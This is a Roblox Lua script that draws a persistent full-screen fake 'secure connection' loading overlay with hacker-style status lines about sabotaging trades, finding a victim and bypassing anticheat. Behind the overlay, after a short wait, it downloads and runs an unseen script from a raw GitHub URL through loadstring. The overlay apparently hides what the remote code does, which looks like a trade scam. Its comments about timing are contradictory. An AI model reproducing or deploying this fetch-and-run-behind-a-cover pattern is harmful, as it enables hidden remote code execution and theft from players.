-- LocalScript inside StarterGui
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local LOADING_TIME = 450 -- 10 minutes (600 seconds)

-- 1. Create the UI Container (Persistent)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "OPScriptHub_Persistent"
screenGui.DisplayOrder = 999999
screenGui.IgnoreGuiInset = true
-- KEY SETTING: This stops the UI from disappearing when the player dies
screenGui.ResetOnSpawn = false 
screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

-- 2. Background Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 12) 
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- 3. Header with Pulse Effect
local header = Instance.new("TextLabel")
header.Size = UDim2.new(0.4, 0, 0.05, 0)
header.Position = UDim2.new(0.3, 0, 0.35, 0)
header.BackgroundTransparency = 1
header.Text = "ESTABLISHING SECURE CONNECTION"
header.TextColor3 = Color3.fromRGB(255, 255, 255)
header.TextScaled = true
header.Font = Enum.Font.GothamBold
header.Parent = mainFrame

-- Pulse Animation for Header
local pulseInfo = TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
TweenService:Create(header, pulseInfo, {TextTransparency = 0.5}):Play()

-- 4. Loading Bar Background
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0.5, 0, 0.008, 0)
barBg.Position = UDim2.new(0.25, 0, 0.42, 0)
barBg.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
barBg.BorderSizePixel = 0
barBg.Parent = mainFrame

-- 5. Progress Fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBg

-- 6. Status Text (Terminal Style)
local statusList = Instance.new("TextLabel")
statusList.Size = UDim2.new(0.6, 0, 0.4, 0)
statusList.Position = UDim2.new(0.2, 0, 0.48, 0)
statusList.BackgroundTransparency = 1
statusList.Text = ""
statusList.RichText = true 
statusList.TextColor3 = Color3.fromRGB(200, 200, 200)
statusList.TextSize = 18
statusList.Font = Enum.Font.Code
statusList.TextYAlignment = Enum.TextYAlignment.Top
statusList.Parent = mainFrame

-- 7. Logic & Content
local lines = {
	"<font color='#00AAFF'>BYPASSING SERVER PLEASE WAIT...</font>",
	"-----------------------------",
	"[+] INITIALIZING VIRTUAL MACHINE...",
	"[+] SABOTAGING TRADE <font color='#00FF00'>v1.2</font>",
	"[+] SCRAPING DATA PACKETS...",
	"[+] DESYNC BYPASS <font color='#00FF00'>ACTIVE</font>",
	"[+] SEARCHING FOR VULNERABILITIES...",
	"[+] FINDING POSSIBLE VICTIM<font color='#00FF00'>LOADED</font>",
	"[+] BYPASSING ROBLOX ANTICHEAT...",
	"[+] TRADE PANEL <font color='#00FF00'>ENABLED</font>",
	"[+] ENCRYPTING DATA STREAMS...",
	"[+] TRADE ENGINE <font color='#00FF00'>5.0</font>",
	"-----------------------------",
	"<font color='#FFFF00'>FINALIZING HANDSHAKE...</font>"
}

-- Start the 10-minute bar
local barTween = TweenService:Create(barFill, TweenInfo.new(LOADING_TIME, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)})
barTween:Play()

-- Staggered Text Reveal
task.spawn(function()
	local currentText = ""
	local delayBetweenLines = LOADING_TIME / (#lines + 1) 

	for i, line in ipairs(lines) do
		currentText = currentText .. line .. "\n"
		statusList.Text = currentText
		task.wait(delayBetweenLines) 
	end
	
	-- Keep at 100% for a moment
	task.wait(5)
	
	-- Final Fade Out
	local fadeOut = TweenService:Create(mainFrame, TweenInfo.new(2), {BackgroundTransparency = 1})
	fadeOut:Play()
	
	for _, child in pairs(mainFrame:GetChildren()) do
		if child:IsA("TextLabel") or child:IsA("Frame") then
			local targetTransparency = child:IsA("TextLabel") and "TextTransparency" or "BackgroundTransparency"
			TweenService:Create(child, TweenInfo.new(1.5), {[targetTransparency] = 1}):Play()
		end
	end
	
	task.wait(2)
	screenGui:Destroy()
end)

-- ... (all your existing loading UI code above) ...

-- Wait for the 10-minute sequence to finish
task.wait(8) 

-- Now that the loading bar is 100%, execute the real script
local success, err = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/script-9209/Test/refs/heads/main/Tradad"))()
end)

if not success then
    warn("Failed to load script: " .. err)
end

-- Finally, remove the loading screen
screenGui:Destroy()
